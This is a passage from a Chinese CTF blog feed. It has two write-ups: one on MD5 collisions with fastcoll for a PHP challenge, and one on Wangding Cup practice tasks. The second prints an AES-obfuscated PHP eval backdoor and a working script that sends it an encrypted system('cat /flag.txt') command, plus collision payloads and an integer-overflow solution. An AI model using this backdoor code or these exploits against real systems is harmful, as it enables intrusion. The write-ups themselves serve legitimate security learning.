    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fastcoll进行md5碰撞</title>
    <link href="/2024/10/27/fastcoll%E5%B7%A5%E5%85%B7md5%E7%A2%B0%E6%92%9E/"/>
    <url>/2024/10/27/fastcoll%E5%B7%A5%E5%85%B7md5%E7%A2%B0%E6%92%9E/</url>
    
    <content type="html"><![CDATA[<h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p>记录一下fastcoll工具的使用</p><h4 id="fastcoll"><a href="#fastcoll" class="headerlink" title="fastcoll"></a>fastcoll</h4><p>做php题的时候有不少md5碰撞的题，fastcoll这个工具还蛮好用的。</p><p>网上下载fastcoll的exe程序，我把程序名改为了fastcoll.exe</p><p>我们再存在fastcoll的目录下打开cmd</p><p>输入<code>fastcoll.exe -h</code>可以查看fastcoll的命令</p><p><img src="/images/fastcoll/1.png"></p><p>常用的参数为<code>-p</code>和<code>-o</code><br>我们首先创建一个名为test的txt文件，写入一个test</p><p>我们可以使用命令<code>fastcoll.exe -p test.txt -o md5_msg1.txt md5_msg2.txt</code>生成两个md5值相等的文件</p><p><img src="/images/fastcoll/2.png"></p><p>我们就生成了两个md5相等的文件，我们可以使用命令分别查看两个文件的md5值</p><p><code>certutil -hashfile md5_msg1.txt MD5</code></p><p><code>certutil -hashfile md5_msg2.txt MD5</code></p><p><img src="/images/fastcoll/3.png"></p><p>可以看到两个文件的md5相等，成功了。</p><h4 id="do"><a href="#do" class="headerlink" title="do"></a>do</h4><h5 id="SHCTF-2024-week1-MD5-Master"><a href="#SHCTF-2024-week1-MD5-Master" class="headerlink" title="SHCTF 2024 week1 MD5 Master"></a>SHCTF 2024 week1 MD5 Master</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><span class="hljs-variable">$master</span> = <span class="hljs-string">&quot;MD5 master!&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>] !== <span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master1&quot;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$master</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;master2&quot;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$master</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;master? &lt;br&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用官方payload，test.txt文件写入MD5 master!</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$md51</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./md5_msg1.txt&#x27;</span>);<br><span class="hljs-variable">$md52</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;./md5_msg2.txt&#x27;</span>);<br><span class="hljs-variable">$master</span> = <span class="hljs-string">&quot;MD5 master!&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$md51</span> !== <span class="hljs-variable">$md52</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md51</span>)===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md52</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;master1=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$md51</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$master</span>)));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&amp;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;master2=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$md52</span>,<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$master</span>)));<br>&#125;<br></code></pre></td></tr></table></figure><p>这题只能bp才行而且传参最后不能有空格，还得加上&amp;才行，有点(</p><p><img src="/images/fastcoll/4.png"></p><p><strong>或者</strong></p><p>可以使用在线工具碰撞<a href="https://rivers.chaitin.cn/tools/md5fastcollision">MD5 在线碰撞 - 百川在线工具箱 (chaitin.cn)</a></p><p><img src="/images/fastcoll/5.png"></p><p>写个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$hex1</span>=<span class="hljs-string">&quot;4d4435206d6173746572210000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c1b4267b7af8c15bdd43f3b5c872ab73bb68aec4178e854614c6412d13b09c4b16c3d1e8ee87996a8b246b992f94546f9602335d1323ce4520e9c7c987820fbeca38ed14cc95aa9fe3aab474c59951b231f3b15f741d12f20bb530382b60a8c8cbab7848af04705cfb48ce5242840911cec5e61e421ccca0b9d01584ce250bf2&quot;</span>;<br><span class="hljs-variable">$hex2</span>=<span class="hljs-string">&quot;4d4435206d6173746572210000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c1b4267b7af8c15bdd43f3b5c872ab73bb68ae44178e854614c6412d13b09c4b16c3d1e8ee87996a8b246b992f14556f9602335d1323ce4520e9c74987820fbeca38ed14cc95aa9fe3aab474c59951b231f3b1df741d12f20bb530382b60a8c8cbab7848af04705cfb48ce5242040911cec5e61e421ccca0b9d01504ce250bf2&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;master1=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&amp;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;master2=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex2</span>));<br></code></pre></td></tr></table></figure><p>手动把两个的<code>MD5+master%21</code>删除，bp传值</p><p><img src="/images/fastcoll/6.png"></p><h4 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h4><p>就这样吧</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024网鼎杯赛前模拟训练</title>
    <link href="/2024/10/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E8%AE%AD%E7%BB%83/"/>
    <url>/2024/10/26/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>​参加了一下网鼎杯的赛前训练，题目还是很简单的，我web狗也能做其他方向的题，写个博客记录一下</p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/1.png"></p><h2 id="Web："><a href="#Web：" class="headerlink" title="Web："></a>Web：</h2><h4 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h4><p>查看群公告，flag在最下面</p><h4 id="Web801"><a href="#Web801" class="headerlink" title="Web801"></a>Web801</h4><p>一道简单文件上传，传个一句话用蚁剑连接即可，不赘述。</p><h4 id="Web802"><a href="#Web802" class="headerlink" title="Web802"></a>Web802</h4><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/2.png"></p><p>点击下方的公告，有id，尝试后是数字型sql联合注入，得到账号密码的MD5值解出来登录，不赘述。</p><h4 id="Web803"><a href="#Web803" class="headerlink" title="Web803"></a>Web803</h4><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/3.png"></p><p>扫目录存在源码泄露，wwwroot.zip解压可以得到一堆php文件，尝试访问这些php发现都是500</p><p>审计是不可能审计的，写个python脚本看看是不是都不能访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> request<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_files</span>(<span class="hljs-params">directory</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Get a list of all files in the given directory and subdirectories.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> [os.path.join(root, file) <span class="hljs-keyword">for</span> root, _, files <span class="hljs-keyword">in</span> os.walk(directory) <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_url</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Build the URL from the given file path.&quot;&quot;&quot;</span><br>    name = file_path.replace(<span class="hljs-string">&quot;D:\\下载\\wwwroot\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;http://xxx<span class="hljs-subst">&#123;name&#125;</span>&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_url</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Fetch the content from the URL and return it if the response is valid.&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> request.urlopen(url) <span class="hljs-keyword">as</span> response:<br>            <span class="hljs-keyword">if</span> response.getcode() == <span class="hljs-number">200</span>:<br>                text = response.read().decode()<br>                <span class="hljs-keyword">return</span> text  <span class="hljs-comment"># Return the content if status code is 200</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>       <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;erro!&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    directory = <span class="hljs-string">&quot;D:\\下载\\wwwroot&quot;</span><br>    files = get_files(directory)<br><br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        url = build_url(file)<br>        content = fetch_url(url)<br>        <span class="hljs-keyword">if</span> content:  <span class="hljs-comment"># Only print if content is returned (i.e., status code is 200)</span><br>            <span class="hljs-built_in">print</span>(url)<br>            <span class="hljs-built_in">print</span>(content)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>最后发现只有describedssTest.php和index.html可以访问,找到入口了</p><p>打开phpstorm审计一下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-variable">$p8</span>=<span class="hljs-string">&#x27;3b7430adaed18facca7b799229138b7b&#x27;</span>;<br><span class="hljs-variable">$a8</span>=<span class="hljs-string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR0ZLV1ZwdU9XSkZORmh2WnpoS1RrNW1jRTFrTkdjOVBRPT0=&#x27;</span>;<br><span class="hljs-variable">$d8</span>=<span class="hljs-string">&#x27;TURNeU9UWTBOelUwTmprd05UUTVOR012V1c5cVJXNXBkWEJyZDFsemJsQlpNMmRITjNaYWVFVnFPVWRqVnpoWlUyNXZNbmhDU21jd2RHTkxRazF2U1hvMU9FNUNWM2RNUjFWYVJuVnBiV3czUlVwUldFMTFhakp2VjJKS1NIVlJUMU5UYjNoSWExUk5hMlZXY21OdlRuaHVRMjlsVkV4aEwzbGpQUT09&#x27;</span>;<br><span class="hljs-variable">$v8</span>=<span class="hljs-string">&#x27;0329647546905494&#x27;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<span class="hljs-variable">$cipher</span>=<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>;<br>    <span class="hljs-variable">$encrypted</span>=<span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$D</span>,<span class="hljs-variable">$cipher</span>,<span class="hljs-variable">$K</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>]);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>].<span class="hljs-variable">$encrypted</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>, <span class="hljs-variable">$K</span></span>)</span>&#123;<span class="hljs-variable">$cipher</span>=<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>;<br>    <span class="hljs-variable">$decodedData</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$D</span>));<br>    <span class="hljs-variable">$encryptedData</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$decodedData</span>, <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$cipher</span>));<br>    <span class="hljs-variable">$decrypted</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$encryptedData</span>,<span class="hljs-variable">$cipher</span>,<span class="hljs-variable">$K</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted</span>;<br>&#125;<br><span class="hljs-variable">$a8</span>=<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">d</span>(<span class="hljs-variable">$a8</span>,<span class="hljs-variable">$p8</span>));<br><span class="hljs-title function_ invoke__">ob_start</span>();<br><span class="hljs-variable">$a8</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">d</span>(<span class="hljs-variable">$d8</span>,<span class="hljs-variable">$p8</span>)));<br><span class="hljs-variable">$O</span>=<span class="hljs-title function_ invoke__">ob_get_contents</span>();<br><span class="hljs-title function_ invoke__">ob_end_clean</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">e</span>(<span class="hljs-variable">$O</span>,<span class="hljs-variable">$p8</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>aes加密和解密，看不出什么猫腻，有两个密文a8和d8，使用调试大法</p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/4.png"></p><p>可以看到a8的值为<code>assert</code></p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/5.png"></p><p>d8的值为<code>@eval(&quot;if(md5(@\$_GET[&#39;id&#39;])===\$p8)&#123;@eval(trim(d(\$_POST[&#39;d&#39;],\$p8)));&#125;&quot;)</code></p><p>即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])===<span class="hljs-variable">$p8</span>)&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">d</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;d&#x27;</span>],<span class="hljs-variable">$p8</span>));<br>&#125;)<br></code></pre></td></tr></table></figure><p>结合<code>$a8(trim(d($d8,$p8)));</code></p><p>此处存在后门(没想到还有这种后门)</p><p>可以看到会执行</p><p><code>assert(@eval(&quot;if(md5(@\$_GET[&#39;id&#39;])===\$p8)&#123;@eval(trim(d(\$_POST[&#39;d&#39;],\$p8)));&#125;&quot;))</code></p><p>要满足条件get传参id的md5值等于p8，强比较必须要相等了</p><p>然后post传入参数d，因为外面还套了一层d解密函数，所以命令d一定要为aes加密后的值</p><p>p8破解出来为20241026的两层MD5值</p><p>写一个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p8</span>=<span class="hljs-string">&#x27;3b7430adaed18facca7b799229138b7b&#x27;</span>;<br><span class="hljs-variable">$v8</span>=<span class="hljs-string">&#x27;0329647546905494&#x27;</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://xxx/describedssTest.php?id=04c50eb4bc04c76311d03550ee2c1b71&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>, <span class="hljs-variable">$K</span></span>)</span>&#123;<span class="hljs-variable">$cipher</span>=<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>;<br>    <span class="hljs-variable">$decodedData</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$D</span>));<br>    <span class="hljs-variable">$encryptedData</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$decodedData</span>, <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$cipher</span>));<br>    <span class="hljs-variable">$decrypted</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$encryptedData</span>,<span class="hljs-variable">$cipher</span>,<span class="hljs-variable">$K</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$K</span></span>)</span>&#123;<span class="hljs-variable">$cipher</span>=<span class="hljs-string">&#x27;aes-128-cbc&#x27;</span>;<br>    <span class="hljs-variable">$D</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag.txt&#x27;);&quot;</span>;<br>    <span class="hljs-variable">$encrypted</span>=<span class="hljs-title function_ invoke__">openssl_encrypt</span>(<span class="hljs-variable">$D</span>,<span class="hljs-variable">$cipher</span>,<span class="hljs-variable">$K</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>]);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;v8&#x27;</span>].<span class="hljs-variable">$encrypted</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">e</span>(<span class="hljs-variable">$p8</span>);<br><span class="hljs-variable">$params</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;d&#x27;</span> =&gt; <span class="hljs-variable">$d</span><br>);<br><br><span class="hljs-comment">//将参数数组拼接成字符串</span><br><span class="hljs-variable">$params</span> = <span class="hljs-title function_ invoke__">http_build_query</span>(<span class="hljs-variable">$params</span>);<br><br><span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;http&#x27;</span> =&gt; <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;method&#x27;</span> =&gt; <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$params</span>,<br>        <span class="hljs-string">&#x27;timeout&#x27;</span> =&gt; <span class="hljs-number">60</span> <span class="hljs-comment">//超时时间（单位：s）</span><br>    )<br>);<br><span class="hljs-variable">$context</span> = <span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$options</span>);<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>, <span class="hljs-literal">false</span>, <span class="hljs-variable">$context</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">d</span>(<span class="hljs-variable">$result</span>,<span class="hljs-variable">$p8</span>);<br></code></pre></td></tr></table></figure><p>本地复现也是可以成功的</p><p>直接接出flag</p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/6.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>一道整数溢出题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">char</span> flag[<span class="hljs-number">32</span>];<br>FILE* f = fopen(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span> (f == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;flag not found&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>fgets(flag, <span class="hljs-number">32</span>, f);<br>fclose(f);<br><br>setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input: &quot;</span>);<br><span class="hljs-type">char</span> buffer[<span class="hljs-number">16</span>];<br>fgets(buffer, <span class="hljs-number">16</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-type">int</span> val = atoi(buffer);<br><span class="hljs-keyword">if</span> (val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: no negative numbers allowed!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> doubled = <span class="hljs-number">2</span> * val;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Doubled: %i\n&quot;</span>, doubled);<br><span class="hljs-keyword">if</span> (doubled == <span class="hljs-number">-100</span>) &#123;<br><span class="hljs-built_in">puts</span>(flag);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>flag为32位，我们输入的int类型的val不能小于0，最后int类型的doubled要为-100</p><p>doubled为2倍val，构造整数溢出</p><p>64位的机器中int类型的范围为-2147483648～2147483647</p><p>输入一个不超过范围的整数，但是乘以2为-100可以尝试出来</p><p>最后val&#x3D;2147483598</p><p><img src="/images/wangdingcup2024%E6%A8%A1%E6%8B%9F/7.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseEngineeringChallenge</span> &#123;<br>  